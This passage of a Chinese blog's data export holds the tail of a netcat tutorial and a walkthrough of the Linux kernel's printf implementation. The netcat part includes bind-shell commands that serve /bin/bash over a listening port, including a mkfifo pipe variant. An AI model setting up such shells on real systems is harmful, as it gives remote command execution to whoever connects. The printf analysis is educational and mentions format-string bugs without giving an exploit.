bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> <span class=\"_\">-l</span> port <span class=\"_\">-e</span> /bin/bash -i</div></pre></td></tr></table></figure></p>\n<p>在Client端：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> server_ip port</div></pre></td></tr></table></figure></p>\n<p>一般用BSD的netcat不支持-e或者-c参数，所以可以通过建立管道文件来进行读写:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$mkfifo</span> /tmp/tmp_fifo</div><div class=\"line\"><span class=\"variable\">$cat</span> /tmp/tmp_fifo | /bin/bash -i 2&gt;&amp;1 | nc <span class=\"_\">-l</span> port &gt; /tmp/tmp_fifo</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/nc_bind_shell.png\" alt=\"bind_shell\"></p>\n<h2 id=\"4-传送文件\"><a href=\"#4-传送文件\" class=\"headerlink\" title=\"4. 传送文件\"></a>4. 传送文件</h2><p>说实话，在局域网里面传文件还是有些麻烦的．虽然已经有了ftp,smb等协议工具，但是服务端的配置很麻烦．但是有了nc就好了．利用重定向操作，直接实现顶级的文件传送．要传送目录的话可以先用tar等工具压缩和打包，然后再传送，同时支持加解密工具的使用，使得网络窃听者无法对嗅探的流量进行直接地解密．</p>\n<p>Sender:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> <span class=\"_\">-l</span> Port &lt; file</div></pre></td></tr></table></figure></p>\n<p>Receiver:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> IP Port &gt; file</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/nc_file_send.png\" alt=\"file_send\"><br>当然发送者和接受者的重定向也可以反回来使用，都是没问题的．可以多测试一下．如果利用这个小demo再编程做一个文件服务器的应该也可以哦．</p>\n<hr>\n<h1 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3. 总结\"></a>3. 总结</h1><p>对于*nix学习，最好有一本书在手，然后参照命令过一遍，命令很多确实不好记，可以等以后需要的时候再去查，其实用多了就记住了．对于nc这个好的工具目前正好有需求呢所以就学习了一下…</p>\n"},{"title":"一起来撸printf吧","date":"2016-09-25T12:17:43.000Z","_content":"\n> printf实现还隐藏了很多参数,例如%n,printf返回值是啥你知道吗?格式化字符串漏洞成因何在?这里分析Linux内核中的printf实现,而非glibc库中的标准实现(我们用的肯定是标准库咯,不过很复杂~_~),因为这里没有%f等浮点类型的匹配,简单一些.\n\n参考资料:  \n[Linus的github仓库https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c](https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c)\n\n\n## printf大体\n首先我们找到printf函数的实现(由于x86体系容易理解便选择了这个体系),可以看到申请了1024个字节的空间来保存要格式化串,有人会问要是我给出的参数超过了1024不就缓冲区溢出程序会crash掉吗?我觉得编译器肯定会察觉到的,有兴趣的自己鼓捣下...大体就是将传递进来的参数根据压栈的顺序逐个取出并格式化成字符串,这个是在vsprintf函数实现的,返回值是两个地址的差,即本次输出的字符串数目.最后调用puts函数向终端输出.最后后才返回本次输出字符串数目.\n![printf](/images/printf.png)\n## va_系类宏\n然后我们利用sublime的插件来jump到`va_list`的定义,发现是一个char*的typedef.干脆就一起来认识一下`va_`系列的宏.\n\n`acpi_native_int`也是一个typedef,根据最开始的配置决定是s32还是s64,在x86这里肯定就是有符号的32位了,即int类型的.`_AUPBND`和`_ADNBND`两个宏的值一样.而`_bnd`这个宏在32b体系下给出的是类型X的大小的4字节对齐值.在printf里面用的时候关系不是很大,因为格式化的时候不会是很大结构体(%结构体根本没实现啊),纵然是小于4字节的char,short之类的,存的时候可能是那么多字节,但是压栈的时候编译器会毫不犹豫地安排用一个寄存器扩展并压入栈顶的指令,所以不用担心,可以认为这个宏在printf里面仅仅是4字节对齐没问题的.`va_start(ap, A)`这个宏接到A(fmt)地址,再+4赋值给ap,原因在于A(fmt)是printf的第一个参数(格式化字符串含有%的部分),+4之后才能对准第一个真正要格式化的参数.而`va_arg(ap, T)`目的是先使得ap移往后一个参数但是返回的值确实本次参数的值,比较巧妙.`va_end(ap)`仅仅为了保证安全而象征性地将ap指向NULL.\n![va_arg](/images/va_arg.png)\n## vsprintf\nvsprintf这个函数有几个重要的局部变量需要注意,英文注释写的很清楚了,flags标志主要是关于数字对齐这一块,等到number函数被调用的时候会判断的.field_width字段主要是占用宽度计算.precision是精度计算,其实是输出个字符个数控制.qualifier是对于长整型的扩展,例如将int转为long.(x86下int=long)  \n![vsprintf](/images/vsprintf.png)\n在定义了局部变量之后,一个for循环遍历fmt所有的字符,取出特别的%来格式化,最后计算地址偏移便完结了.当找到第一个%的时候,首先处理flags字段,定义个标号repeat来快速跳出,虽然听说C标准不推荐使用goto语句,但是能够提高效率为什么不能用呢?代码片段如下:\n```C\n#define ZEROPAD\t1\t\t/* pad with zero */\n#define SIGN\t2\t\t/* unsigned/signed long */\n#define PLUS\t4\t\t/* show plus */\n#define SPACE\t8\t\t/* space if plus */\n#define LEFT\t16\t\t/* left justified */\n#define SMALL\t32\t\t/* Must be 32 == 0x20 */\n#define SPECIAL\t64\t\t/* 0x */\n/* process flags */\n\t\tflags = 0;\n\t      repeat:\n\t\t++fmt;\t\t/* this also skips first '%' */\n\t\tswitch (*fmt) {\n\t\tcase '-':\n\t\t\tflags |= LEFT;\n\t\t\tgoto repeat;\n\t\tcase '+':\n\t\t\tflags |= PLUS;\n\t\t\tgoto repeat;\n\t\tcase ' ':\n\t\t\tflags |= SPACE;\n\t\t\tgoto repeat;\n\t\tcase '#':\n\t\t\tflags |= SPECIAL;\n\t\t\tgoto repeat;\n\t\tcase '0':\n\t\t\tflags |= ZEROPAD;\n\t\t\tgoto repeat;\n\t\t}\n```\n某些字段就不说了,用过printf的应该都知道的,其中的`#`作用就是方便16进制和8进制的格式化,例如`%#x`就会被默认加上`0x`,而`%#o`就会被默认加上`0`,具体可以看后面number函数实现就知道了.  \n\n----------------\n> 找工作太忙了,今天才得有空继续分析^~^(2016.10.17) \n\n--------------\n接下来就会去获得宽度字段,利用`isdigital`函数一步实现字符串转整型并使得fmt指针指向后续格式符.如果用`*`代替,将直接将压入的参数转为整型赋值为宽度字段.并根据正负号置标志位采取相应的对齐方式(默认为右对齐).  \n\n```C\n/* get field width */\n\t\tfield_width = -1;\n\t\tif (isdigit(*fmt))\n\t\t\tfield_width = skip_atoi(&fmt);\n\t\telse if (*fmt == '*') {\n\t\t\t++fmt;\n\t\t\t/* it's the next argument */\n\t\t\tfield_width = va_arg(args, int);\n\t\t\tif (field_width < 0) {\n\t\t\t\tfield_width = -field_width;\n\t\t\t\tflags |= LEFT;\n\t\t\t}\n\t\t}\n```\n再下来就是获取精度了,一般有浮点类型的就得保留多少位的精度.首先得在串中检测到有`.`字符,之后的处理跟宽度就差不多了.先保存相关的参数然后会传到另外的函数做具体处理的.对于有`l`,`L`,`h`跟在后面的将使得`qualifier`被置为其ascll码值.\n```C\n/* get the precision */\n\t\tprecision = -1;\n\t\tif (*fmt == '.') {\n\t\t\t++fmt;\n\t\t\tif (isdigit(*fmt))\n\t\t\t\tprecision = skip_atoi(&fmt);\n\t\t\telse if (*fmt == '*') {\n\t\t\t\t++fmt;\n\t\t\t\t/* it's the next argument */\n\t\t\t\tprecision = va_arg(args, int);\n\t\t\t}\n\t\t\tif (precision < 0)\n\t\t\t\tprecision = 0;\n\t\t}\n\n\t\t/* get the conversion qualifier */\n\t\tqualifier = -1;\n\t\tif (*fmt == 'h' || *fmt == 'l' || *fmt == 'L') {\n\t\t\tqualifier = *fmt;\n\t\t\t++fmt;\n\t\t}\n```\n之后就进入最后的格式化匹配了,根据提供的格式化类型对压入的参数进行相应操作.首先会使得base默认为10进制,如果类似%c的话,直接根据左右对齐方式填充空白符,中间以`int`类型为地址单元取得参数的值直接强制转化为`unsigned char`类型的字符.为什么呢?详情参考我的另外一篇[文章](http://www.rutk1t0r.cn/2016/08/21/memory-align/),我们需要知道这个是编译器自己这么压进去的就得这么去接收就行了.对于类似%s,首先取得参数首地址,然后调用安全的`strnlen`函数获取填充空白的长度.之后逐字符地拷贝,若非右对齐后续还需继续填充空白,`if`和`while`没有加`{}`可能看得不太清楚.建议源代码中的风格严谨一点好.对于%p如果没有字段宽度值则默认为2个指针大小的宽度,并使得flags的ZEROPAD置位.而后直接送往number函数继续处理.%n可是一个很生疏的东西,我猜测这个参数最初的目的是用于调试用的,可以检查本次printf调用在%n之前输出的字符个数,并将这个值赋给调用者传递进来的参数地址处,但是如果使用不当,就可能会造成`任意地址读写任意数据`的格式化字符串漏洞.\n之后的几个参数大都是置位相应标志位而已,后期直接送往number函数处理,需要注意的是之前这几个参数后面完成后用的是`continue`,意思是直接跳转到最外面的`for`循环进行下一个字符的匹配,而%xXdiu后面接的是`break`,表示退出`switch`,转而进行后面的`h,L,l`的长类型的处理去了.还要注意在`switch case break`的结构中,如果`case`了第一个条件,之后如果没有遇到`break`,程序的控制流程将忽略后面的`case`条件,直接执行语句部分,直到遇见结束的`break`.因为这里已经出现了这种用法(匹配x的时候),所以应该注意一下,某些笔试题也会考察这个知识点.\n```C\n/* default base */\n\t\tbase = 10;\n\n\t\tswitch (*fmt) {\n\t\tcase 'c':\n\t\t\tif (!(flags & LEFT))\n\t\t\t\twhile (--field_width > 0)\n\t\t\t\t\t*str++ = ' ';\n\t\t\t*str++ = (unsigned char)va_arg(args, int);\n\t\t\twhile (--field_width > 0)\n\t\t\t\t*str++ = ' ';\n\t\t\tcontinue;\n\n\t\tcase 's':\n\t\t\ts = va_arg(args, char *);\n\t\t\tlen = strnlen(s, precision);\n\n\t\t\tif (!(flags & LEFT))\n\t\t\t\twhile (len < field_width--)\n\t\t\t\t\t*str++ = ' ';\n\t\t\tfor (i = 0; i < len; ++i)\n\t\t\t\t*str++ = *s++;\n\t\t\twhile (len < field_width--)\n\t\t\t\t*str++ = ' ';\n\t\t\tcontinue;\n\n\t\tcase 'p':\n\t\t\tif (field_width == -1) {\n\t\t\t\tfield_width = 2 * sizeof(void *);\n\t\t\t\tflags |= ZEROPAD;\n\t\t\t}\n\t\t\tstr = number(str,\n\t\t\t\t     (unsigned long)va_arg(args, void *), 16,\n\t\t\t\t     field_width, precision, flags);\n\t\t\tcontinue;\n\n\t\tcase 'n':\n\t\t\tif (qualifier == 'l') {\n\t\t\t\tlong *ip = va_arg(args, long *);\n\t\t\t\t*ip = (str - buf);\n\t\t\t} else {\n\t\t\t\tint *ip = va_arg(args, int *);\n\t\t\t\t*ip = (str - buf);\n\t\t\t}\n\t\t\tcontinue;\n\n\t\tcase '%':\n\t\t\t*str++ = '%';\n\t\t\tcontinue;\n\n\t\t\t/* integer number formats - set up the flags and \"break\" */\n\t\tcase 'o':\n\t\t\tbase = 8;\n\t\t\tbreak;\n\n\t\tcase 'x':\n\t\t\tflags |= SMALL;\n\t\tcase 'X':\n\t\t\tbase = 16;\n\t\t\tbreak;\n\n\t\tcase 'd':\n\t\tcase 'i':\n\t\t\tflags |= SIGN;\n\t\tcase 'u':\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\t*str++ = '%';\n\t\t\tif (*fmt)\n\t\t\t\t*str++ = *fmt;\n\t\t\telse\n\t\t\t\t--fmt;\n\t\t\tcontinue;\n\t\t}\n\t\tif (qualifier == 'l')\n\t\t\tnum = va_arg(args, unsigned long);\n\t\telse if (qualifier == 'h') {\n\t\t\tnum = (unsigned short)va_arg(args, int);\n\t\t\tif (flags & SIGN)\n\t\t\t\tnum = (short)num;\n\t\t} else if (flags & SIGN)\n\t\t\tnum = va_arg(args, int);\n\t\telse\n\t\t\tnum = va_arg(args, unsigned int);\n\t\tstr = number(str, num, base, field_width, precision, flags);\n\t}\n\t*str = '\\0';\n\treturn str - buf;\n```\n\n## number函数\n首先分析一下这个宏定义的作用,如果先看number函数里面用到这个宏居然是放在`[]`里面的,因此可以猜测作用是用来偏移寻址的.有些人会问,C语言里面可以这样用吗?(答案很明了了,不能用怎么编译通过呢?所以还是需要多看别人写的代码,有些用法不常用的但是如果好用就可以Get到了)编译器编译的时候能够生成合适的代码即可.这个宏的作用是求出n对base余数,并使得n变为商,同时\"返回\"余数__res.主要用于八进制和十六进制的数值与字符的转换.(不知是否C语言的思想是一切皆为表达式,据说类*nix操作系统和shell的核心思想分别是`一切皆为文件`和`一切皆为表达式`.)\n```C\n#define __do_div(n, base) ({ \\\nint __res; \\\n__res = ((unsigned long) n) % (unsigned) base; \\\nn = ((unsigned long) n) / (unsigned) base; \\\n__res; })\n```\n再来看number函数的实现,首先分析函数的参数以及返回值,作为软件工程师应该要做到文档清晰可理解,各个接口的参数以及返回值的作用解释清楚.`static`类型的函数表明这个函数仅仅在这个文件作用域可以调用,这样减少了命名冲突问题.`char *`返回值表明能够实现链式功能,可对比`strcpy`函数的实现.再来看参数,第一个str即上层传入的str首地址,表明要对上层传进来的参数空间进行修改.第二个`num`是对%idp等格式化的栈参数的一个拷贝.第三个`base`顾名思义就是进制基数了.第四个`size`即为对齐宽度.第五个为精度,最后一个为标志位字段.  \n首先定义一个静态的常量数组保存进制转换的字符,便于直接寻址取得相应字符赋值给str.`tmp[66]`我认为目前来看是有点长,它的作用是暂存num转换之后的数据,num最大为`long`的最大值,为2^64(64bit),也就是16个F,即16个字符即可,愚以为有点多余~~~.locase探测type字段的SMALL标志,不得不说SMALL标志位也是取得合理,32->第4位置位,使得可以很轻松地`或`运算实现大写字符->小写字符(ascll码相差32).如果`0`和`-`同时置位,gcc编译器会提示`warning: '0' flag ignored with '-' flag in gnu_printf format [-Wformat=]`,表明会忽略掉`0`的作用,具体实现也是这样.首先会判断是否有左对齐标志,有的话就用经典的`&= ~`运算来清除相应标志位,这个在嵌入式开发里面很常见,一般是操作外设寄存器用的.在这里的逻辑是清除`补零`标志.这里也有一个健壮性的判断,不过number函数仅限于本文件调用,一般的开发者应该不会传入错误的base.字符`c`也是用来填充的,为`0`或者空格.接下来就是检测SIGH标志,并根据正负和0填充的需求占据`size`和置位`sign`.之后判断16进制和8进制情况,16进制的`size`减2是由于要填充`0x`或者`0X`,8进制只需要填充`0`即可.之后就开始进制转换成字符了,并根据`locase`的实际情况对于16进制翻转大小写字符.而对于数字0~9,由于他们的ascll码的第4位已经置位,所以或上1并不影响自身的值,而默认的大写字母第4位没有置位,如果程序员需要转换就可以转换.这个是很巧妙的!!!值得学习的技巧.传进来的`precision`表示精度,由于这里没有浮点匹配,这里就主要用来截取串的长度.如果`ZEROPAD`和`LEFT`都没有置位,就填充空格.然后根据进制继续填充数值.如果不是左对齐,就根据`size`的剩余大小继续填充`c`,后面就根据i的情况填充了,直到满足`size`这个宽度域为0.最后返回`str`的首地址.\n```C\nstatic char *number(char *str, long num, int base, int size, int precision,\n\t\t    int type)\n{\n\t/* we are called with base 8, 10 or 16, only, thus don't need \"G...\"  */\n\tstatic const char digits[16] = \"0123456789ABCDEF\"; /* \"GHIJKLMNOPQRSTUVWXYZ\"; */\n\n\tchar tmp[66];\n\tchar c, sign, locase;\n\tint i;\n\n\t/* locase = 0 or 0x20. ORing digits or letters with 'locase'\n\t * produces same digits or (maybe lowercased) letters */\n\tlocase = (type & SMALL);\n\tif (type & LEFT)\n\t\ttype &= ~ZEROPAD;\n\tif (base < 2 || base > 16)\n\t\treturn NULL;\n\tc = (type & ZEROPAD) ? '0' : ' ';\n\tsign = 0;\n\tif (type & SIGN) {\n\t\tif (num < 0) {\n\t\t\tsign = '-';\n\t\t\tnum = -num;\n\t\t\tsize--;\n\t\t} else if (type & PLUS) {\n\t\t\tsign = '+';\n\t\t\tsize--;\n\t\t} else if (type & SPACE) {\n\t\t\tsign = ' ';\n\t\t\tsize--;\n\t\t}\n\t}\n\tif (type & SPECIAL) {\n\t\tif (base == 16)\n\t\t\tsize -= 2;\n\t\telse if (base == 8)\n\t\t\tsize--;\n\t}\n\ti = 0;\n\tif (num == 0)\n\t\ttmp[i++] = '0';\n\telse\n\t\twhile (num != 0)\n\t\t\ttmp[i++] = (digits[__do_div(num, base)] | locase);\n\tif (i > precision)\n\t\tprecision = i;\n\tsize -= precision;\n\tif (!(type & (ZEROPAD + LEFT)))\n\t\twhile (size-- > 0)\n\t\t\t*str++ = ' ';\n\tif (sign)\n\t\t*str++ = sign;\n\tif (type & SPECIAL) {\n\t\tif (base == 8)\n\t\t\t*str++ = '0';\n\t\telse if (base == 16) {\n\t\t\t*str++ = '0';\n\t\t\t*str++ = ('X' | locase);\n\t\t}\n\t}\n\tif (!(type & LEFT))\n\t\twhile (size-- > 0)\n\t\t\t*str++ = c;\n\twhile (i < precision--)\n\t\t*str++ = '0';\n\twhile (i-- > 0)\n\t\t*str++ = tmp[i];\n\twhile (size-- > 0)\n\t\t*str++ = ' ';\n\treturn str;\n}\n```\n## puts\n至于puts的实现应该就不难了,内核中有很多处代码.应该就是简单地逐字节地拷贝到某缓冲区,再由内核的IO调度机制向屏幕或者串口等字符驱动设备文件拷贝输出.一般在嵌入式开发里面串口输出的比较常见.而普通PC的CPU(类似以前8086时代的intel)可能是按照主板等的设计给显存预留出地址空间,只要CPU把数据送往那个地址空间(貌似是0x0B800)显示设备就能够打印出相应的字符.\n## 总结\n最起初的printf实现大概就这么多吧,可能内核开发者考虑到某些CPU没有浮点体系就没有把处理浮点类型的情况加进去的,标准的printf实现还是需要参考glibc库的.后期有空继续分析.对了,前面有说到`格式化字符串漏洞`参考看雪论坛这篇[文章](http://bbs.pediy.com/showthread.php?t=213153),如果没注册看不了的话先[戳这里吧](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458279936&idx=1&sn=2eb47265a0d170c45403d4b5d9097549&chksm=b181508a86f6d99c27d4b2c9281a573ac16284c3a7f7f6f3d9cad3a7452f3bcc22ba15616303&scene=0#wechat_redirect)\n","source":"_posts/一起来撸printf吧.md","raw":"---\ntitle: 一起来撸printf吧\ndate: 2016-09-25 20:17:43\ncategories:\n- study\n- misc\n\ntags:\n- C/C++\n- Linux kernel\n\n---\n\n> printf实现还隐藏了很多参数,例如%n,printf返回值是啥你知道吗?格式化字符串漏洞成因何在?这里分析Linux内核中的printf实现,而非glibc库中的标准实现(我们用的肯定是标准库咯,不过很复杂~_~),因为这里没有%f等浮点类型的匹配,简单一些.\n\n参考资料:  \n[Linus的github仓库https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c](https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c)\n\n\n## printf大体\n首先我们找到printf函数的实现(由于x86体系容易理解便选择了这个体系),可以看到申请了1024个字节的空间来保存要格式化串,有人会问要是我给出的参数超过了1024不就缓冲区溢出程序会crash掉吗?我觉得编译器肯定会察觉到的,有兴趣的自己鼓捣下...大体就是将传递进来的参数根据压栈的顺序逐个取出并格式化成字符串,这个是在vsprintf函数实现的,返回值是两个地址的差,即本次输出的字符串数目.最后调用puts函数向终端输出.最后后才返回本次输出字符串数目.\n![printf](/images/printf.png)\n## va_系类宏\n然后我们利用sublime的插件来jump到`va_list`的定义,发现是一个char*的typedef.干脆就一起来认识一下`va_`系列的宏.\n\n`acpi_native_int`也是一个typedef,根据最开始的配置决定是s32还是s64,在x86这里肯定就是有符号的32位了,即int类型的.`_AUPBND`和`_ADNBND`两个宏的值一样.而`_bnd`这个宏在32b体系下给出的是类型X的大小的4字节对齐值.在printf里面用的时候关系不是很大,因为格式化的时候不会是很大结构体(%结构体根本没实现啊),纵然是小于4字节的char,short之类的,存的时候可能是那么多字节,但是压栈的时候编译器会毫不犹豫地安排用一个寄存器扩展并压入栈顶的指令,所以不用担心,可以认为这个宏在printf里面仅仅是4字节对齐没问题的.`va_start(ap, A)`这个宏接到A(fmt)地址,再+4赋值给ap,原因在于A(fmt)是printf的第一个参数(格式化字符串含有%的部分),+4之后才能对准第一个真正要格式化的参数.而`va_arg(ap, T)`目的是先使得ap移往后一个参数但是返回的值确实本次参数的值,比较巧妙.`va_end(ap)`仅仅为了保证安全而象征性地将ap指向NULL.\n![va_arg](/images/va_arg.png)\n## vsprintf\nvsprintf这个函数有几个重要的局部变量需要注意,英文注释写的很清楚了,flags标志主要是关于数字对齐这一块,等到number函数被调用的时候会判断的.field_width字段主要是占用宽度计算.precision是精度计算,其实是输出个字符个数控制.qualifier是对于长整型的扩展,例如将int转为long.(x86下int=long)  \n![vsprintf](/images/vsprintf.png)\n在定义了局部变量之后,一个for循环遍历fmt所有的字符,取出特别的%来格式化,最后计算地址偏移便完结了.当找到第一个%的时候,首先处理flags字段,定义个标号repeat来快速跳出,虽然听说C标准不推荐使用goto语句,但是能够提高效率为什么不能用呢?代码片段如下:\n```C\n#define ZEROPAD\t1\t\t/* pad with zero */\n#define SIGN\t2\t\t/* unsigned/signed long */\n#define PLUS\t4\t\t/* show plus */\n#define SPACE\t8\t\t/* space if plus */\n#define LEFT\t16\t\t/* left justified */\n#define SMALL\t32\t\t/* Must be 32 == 0x20 */\n#define SPECIAL\t64\t\t/* 0x */\n/* process flags */\n\t\tflags = 0;\n\t      repeat:\n\t\t++fmt;\t\t/* this also skips first '%' */\n\t\tswitch (*fmt) {\n\t\tcase '-':\n\t\t\tflags |= LEFT;\n\t\t\tgoto repeat;\n\t\tcase '+':\n\t\t\tflags |= PLUS;\n\t\t\tgoto repeat;\n\t\tcase ' ':\n\t\t\tflags |= SPACE;\n\t\t\tgoto repeat;\n\t\tcase '#':\n\t\t\tflags |= SPECIAL;\n\t\t\tgoto repeat;\n\t\tcase '0':\n\t\t\tflags |= ZEROPAD;\n\t\t\tgoto repeat;\n\t\t}\n```\n某些字段就不说了,用过printf的应该都知道的,其中的`#`作用就是方便16进制和8进制的格式化,例如`%#x`就会被默认加上`0x`,而`%#o`就会被默认加上`0`,具体可以看后面number函数实现就知道了.  \n\n----------------\n> 找工作太忙了,今天才得有空继续分析^~^(2016.10.17) \n\n--------------\n接下来就会去获得宽度字段,利用`isdigital`函数一步实现字符串转整型并使得fmt指针指向后续格式符.如果用`*`代替,将直接将压入的参数转为整型赋值为宽度字段.并根据正负号置标志位采取相应的对齐方式(默认为右对齐).  \n\n```C\n/* get field width */\n\t\tfield_width = -1;\n\t\tif (isdigit(*fmt))\n\t\t\tfield_width = skip_atoi(&fmt);\n\t\telse if (*fmt == '*') {\n\t\t\t++fmt;\n\t\t\t/* it's the next argument */\n\t\t\tfield_width = va_arg(args, int);\n\t\t\tif (field_width < 0) {\n\t\t\t\tfield_width = -field_width;\n\t\t\t\tflags |= LEFT;\n\t\t\t}\n\t\t}\n```\n再下来就是获取精度了,一般有浮点类型的就得保留多少位的精度.首先得在串中检测到有`.`字符,之后的处理跟宽度就差不多了.先保存相关的参数然后会传到另外的函数做具体处理的.对于有`l`,`L`,`h`跟在后面的将使得`qualifier`被置为其ascll码值.\n```C\n/* get the precision */\n\t\tprecision = -1;\n\t\tif (*fmt == '.') {\n\t\t\t++fmt;\n\t\t\tif (isdigit(*fmt))\n\t\t\t\tprecision = skip_atoi(&fmt);\n\t\t\telse if (*fmt == '*') {\n\t\t\t\t++fmt;\n\t\t\t\t/* it's the next argument */\n\t\t\t\tprecision = va_arg(args, int);\n\t\t\t}\n\t\t\tif (precision < 0)\n\t\t\t\tprecision = 0;\n\t\t}\n\n\t\t/* get the conversion qualifier */\n\t\tqualifier = -1;\n\t\tif (*fmt == 'h' || *fmt == 'l' || *fmt == 'L') {\n\t\t\tqualifier = *fmt;\n\t\t\t++fmt;\n\t\t}\n```\n之后就进入最后的格式化匹配了,根据提供的格式化类型对压入的参数进行相应操作.首先会使得base默认为10进制,如果类似%c的话,直接根据左右对齐方式填充空白符,中间以`int`类型为地址单元取得参数的值直接强制转化为`unsigned char`类型的字符.为什么呢?详情参考我的另外一篇[文章](http://www.rutk1t0r.cn/2016/08/21/memory-align/),我们需要知道这个是编译器自己这么压进去的就得这么去接收就行了.对于类似%s,首先取得参数首地址,然后调用安全的`strnlen`函数获取填充空白的长度.之后逐字符地拷贝,若非右对齐后续还需继续填充空白,`if`和`while`没有加`{}`可能看得不太清楚.建议源代码中的风格严谨一点好.对于%p如果没有字段宽度值则默认为2个指针大小的宽度,并使得flags的ZEROPAD置位.而后直接送往number函数继续处理.%n可是一个很生疏的东西,我猜测这个参数最初的目的是用于调试用的,可以检查本次printf调用在%n之前输出的字符个数,并将这个值赋给调用者传递进来的参数地址处,但是如果使用不当,就可能会造成`任意地址读写任意数据`的格式化字符串漏洞.\n之后的几个参数大都是置位相应标志位而已,后期直接送往number函数处理,需要注意的是之前这几个参数后面完成后用的是`continue`,意思是直接跳转到最外面的`for`循环进行下一个字符的匹配,而%xXdiu后面接的是`break`,表示退出`switch`,转而进行后面的`h,L,l`的长类型的处理去了.还要注意在`switch case break`的结构中,如果`case`了第一个条件,之后如果没有遇到`break`,程序的控制流程将忽略后面的`case`条件,直接执行语句部分,直到遇见结束的`break`.因为这里已经出现了这种用法(匹配x的时候),所以应该注意一下,某些笔试题也会考察这个知识点.\n```C\n/* default base */\n\t\tbase = 10;\n\n\t\tswitch (*fmt) {\n\t\tcase 'c':\n\t\t\tif (!(flags & LEFT))\n\t\t\t\twhile (--field_width > 0)\n\t\t\t\t\t*str++ = ' ';\n\t\t\t*str++ = (unsigned char)va_arg(args, int);\n\t\t\twhile (--field_width > 0)\n\t\t\t\t*str++ = ' ';\n\t\t\tcontinue;\n\n\t\tcase 's':\n\t\t\ts = va_arg(args, char *);\n\t\t\tlen = strnlen(s, precision);\n\n\t\t\tif (!(flags & LEFT))\n\t\t\t\twhile (len < field_width--)\n\t\t\t\t\t*str++ = ' ';\n\t\t\tfor (i = 0; i < len; ++i)\n\t\t\t\t*str++ = *s++;\n\t\t\twhile (len < field_width--)\n\t\t\t\t*str++ = ' ';\n\t\t\tcontinue;\n\n\t\tcase 'p':\n\t\t\tif (field_width == -1) {\n\t\t\t\tfield_width = 2 * sizeof(void *);\n\t\t\t\tflags |= ZEROPAD;\n\t\t\t}\n\t\t\tstr = number(str,\n\t\t\t\t     (unsigned long)va_arg(args, void *), 16,\n\t\t\t\t     field_width, precision, flags);\n\t\t\tcontinue;\n\n\t\tcase 'n':\n\t\t\tif (qualifier == 'l') {\n\t\t\t\tlong *ip = va_arg(args, long *);\n\t\t\t\t*ip = (str - buf);\n\t\t\t} else {\n\t\t\t\tint *ip = va_arg(args, int *);\n\t\t\t\t*ip = (str - buf);\n\t\t\t}\n\t\t\tcontinue;\n\n\t\tcase '%':\n\t\t\t*str++ = '%';\n\t\t\tcontinue;\n\n\t\t\t/* integer number formats - set up the flags and \"break\" */\n\t\tcase 'o':\n\t\t\tbase = 8;\n\t\t\tbreak;\n\n\t\tcase 'x':\n\t\t\tflags |= SMALL;\n\t\tcase 'X':\n\t\t\tbase = 16;\n\t\t\tbreak;\n\n\t\tcase 'd':\n\t\tcase 'i':\n\t\t\tflags |= SIGN;\n\t\tcase 'u':\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\t*str++ = '%';\n\t\t\tif (*fmt)\n\t\t\t\t*str++ = *fmt;\n\t\t\telse\n\t\t\t\t--fmt;\n\t\t\tcontinue;\n\t\t}\n\t\tif (qualifier == 'l')\n\t\t\tnum = va_arg(args, unsigned long);\n\t\telse if (qualifier == 'h') {\n\t\t\tnum = (unsigned short)va_arg(args, int);\n\t\t\tif (flags & SIGN)\n\t\t\t\tnum = (short)num;\n\t\t} else if (flags & SIGN)\n\t\t\tnum = va_arg(args, int);\n\t\telse\n\t\t\tnum = va_arg(args, unsigned int);\n\t\tstr = number(str, num, base, field_width, precision, flags);\n\t}\n\t*str = '\\0';\n\treturn str - buf;\n```\n\n## number函数\n首先分析一下这个宏定义的作用,如果先看number函数里面用到这个宏居然是放在`[]`里面的,因此可以猜测作用是用来偏移寻址的.有些人会问,C语言里面可以这样用吗?(答案很明了了,不能用怎么编译通过呢?所以还是需要多看别人写的代码,有些用法不常用的但是如果好用就可以Get到了)编译器编译的时候能够生成合适的代码即可.这个宏的作用是求出n对base余数,并使得n变为商,同时\"返回\"余数__res.主要用于八进制和十六进制的数值与字符的转换.(不知是否C语言的思想是一切皆为表达式,据说类*nix操作系统和shell的核心思想分别是`一切皆为文件`和`一切皆为表达式`.)\n```C\n#define __do_div(n, base) ({ \\\nint __res; \\\n__res = ((unsigned long) n) % (unsigned) base; \\\nn = ((unsigned long) n) / (unsigned) base; \\\n__res; })\n```\n再来看number函数的实现,首先分析函数的参数以及返回值,作为软件工程师应该要做到文档清晰可理解,各个接口的参数以及返回值的作用解释清楚.`static`类型的函数表明这个函数仅仅在这个文件作用域可以调用,这样减少了命名冲突问题.`char *`返回值表明能够实现链式功能,可对比`strcpy`函数的实现.再来看参数,第一个str即上层传入的str首地址,表明要对上层传进来的参数空间进行修改.第二个`num`是对%idp等格式化的栈参数的一个拷贝.第三个`base`顾名思义就是进制基数了.第四个`size`即为对齐宽度.第五个为精度,最后一个为标志位字段.  